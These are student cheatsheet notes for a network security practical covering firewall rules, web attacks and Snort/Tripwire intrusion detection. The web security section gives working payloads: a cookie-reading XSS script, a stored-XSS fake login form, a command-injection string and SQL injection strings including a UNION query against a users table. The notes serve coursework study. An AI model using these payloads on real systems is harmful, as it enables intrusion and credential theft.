# Practical Assessment and Quiz 2

# Chapter 5: Firewalls

### How Is This Topic Tested

- A rule set will be given to you and you will be asked to analyze
- Can be rule errors
- Scope of the ruleset
- Others

### Firewall Rules

How rules are applied:

- Ascending Order
- Allow, Block or Customize Access
- Uses protocols, ports and IP addresses
- If a deny rule is placed on 3rd rule, an allow for the same packet on 4th is ignored

Best Practices:

- First rule should be Anti-Spoofing rule to block packets from outside network pretending to be from internal network
- Put more important and frequently accessed rules above
- Sweeping rule at the last one to block all other traffic

Accessing Firewall Rules:

- Windows Firewall with Advanced Security → Inbound/Outbound Rules

ICMP Ping Rule:

- File and Printer Sharing (Echo Request - ICMPv4-In)

### FWBuilder

Negation Rule:

- If a rule is negated, it is not applied even though it is displayed
- Specific elements can be negated too, like source or destinations

Log files:

- Stored in "/var/log/messages/"

![Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Annotation_2020-08-01_141237.png](Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Annotation_2020-08-01_141237.png)

### Resources

[FWBuilderUsersGuide5.pdf](Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/FWBuilderUsersGuide5.pdf)

# Chapter 6: Web Security

## Important Exercises (by Bernard)

- exercise 3
- exercise 4
- exercise 6a
- exercise 7
- exercise 14

## Reflected Cross-Site Scripting

- quick check for XSS vuln

```jsx
<i>bruh</i>
```

- inject js code

```jsx
// this dumps your browser cookies
<script>alert(document.cookie);</script>
```

## Stored Cross-Site Scripting

- Executes for every user who visits page

```jsx
// creates fake login form to trick users
Login to see more features:<br>
<form>
Username : <input type="text"><br>
Password : <input type="password"><br>
<input type="submit" value="login">
</form>
```

## Command Injection

- append extra commands with &&

```bash
# prints out contents of C:\\ drive too (for windows shells)
192.168.12.1 && dir C:\\
```

## SQL Injection

- basic injection

```sql
# add # or ;-- or -- at back to comment any subsequent sql codes
# returns true
bruh' or '0' = '0
```

### Union Attacks

- UNION lets you execute one or more SELECT statements and append results to the original query
    - Note
        - UNION has several limitations like only working with specific data types and requiring the same number of columns for both select queries
        - use UNION ALL instead

```sql
# extra select query for user_id and user columns
bruh' or '0' = '0' union select user_id, user from users #
```

## Intercepting network requests through Burpsuite

- set manual proxy config in browser

![Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled.png](Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled.png)

- start temp project in burpsuite
    - under proxy, ensure intercept is on

    ![Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled%201.png](Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled%201.png)

- in browser fill in inputs you wish to attack and submit them
- in burpsuite, forward all requests until you find the above form request
- surround your params with brackets and "or TRUE" to exploit the loosely validated params

![Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled%202.png](Practical%20Assessment%20and%20Quiz%202%209889bc4e4433458b87b3e750bf590005/Untitled%202.png)

- off intercept to forward the packet to the browser

## SQL Map Cheat sheet

### Note

- if can do manual inject, immediately open up sqlmap

[https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d](https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d)

## Other Resources

[SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

# Chapter 7: Intrusion Detection System

## Examining Intrusion Detection Step by Step

1. Installing the IDS database
2. Gathering data
3. Sending alert messages
4. The IDS responds
5. The administrator assesses damage
6. Following escalation procedures
7. Logging and reviewing the event

## **Snort rules:**

alert tcp 192.198.233.144 80 → any any

- alert : action
- tcp: protocol
- 192.168.233.14: source ip address
- 80: souce port
- → direction
- any: dest ip address
- any: dest port
- snort action for rules
    - Alert: generate an alert
    - Log: log packet details
    - Pass: ignore
    - Activate: alert,then turn on a dynamic rule
    - Dynamic: when activated by activate rule, log packet details

## Snort rule files

- Located at /etc/snort/rules
- create a file /etc/snort/rules/my.rules
- alert tcp <kali ip> any → $HOME_NET any (msg:"TCP traffic from kali!!"; sid:9999;)

Snort rule manual → [http://manual-snort-org.s3-website-us-east-1.amazonaws.com/](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/)   (may ask you to read snort rules and intepret it)

## Snort config information

- Located at /etc/snort/snort.conf
- Esc + Shift G to go to the bottom of the file where you see the list of rule files
- Add in the rule files
- under #site specific rules
- include $RULE_PATH/my.rules
- running snort manually → snort -i eno16777736 -c /etc/snort/snort.conf -l /var/log/snort (specifying the directory to store the logs)

## Snort alert information

- View the alerts at /var/log/snort/alert (*****S* → SYN packet and ****R* → RST packet)
- In the /var/log/snort directory, the snort.log.NNNNN file can be opened in wireshark. It contains the packets that generate the alert

## Running snort as a service

- vi /etc/sysconfig
- INTERFACE = eno16777736
- USER=root
- GROUP=root
- systemctl start snortd (status —> check if it is running and stop→ to stop the snort service)

## Tripware

- Tripwire Policy
    - **vi /etc/tripwire/twpol.txt**
    - remove all unnecessary text file that do not exist in kali
    - **sudo twadmin -m P /etc/tripwire/twpol.txt** (recreate the file Policy file)
    - **sudo tripwire —init**  (create the baseline database which is a snapshot of the current system)
    - **ls /var/lib/tripwire** (shows the newly created database file that ends with .twd)
- Checking for any changes in your system
    - sudo tripwire —check
    - cd /var/lib/tripwire/report
    - ls (shows report file name)
    - sudo twprint —print-report -r report_filename | less

---

*Cheatsheet done by Yi Terng, Kar Wei and Chloe*

*Disclaimer: This cheatsheet is to make your life easier, it does not contain all the information required, use at your own risk.*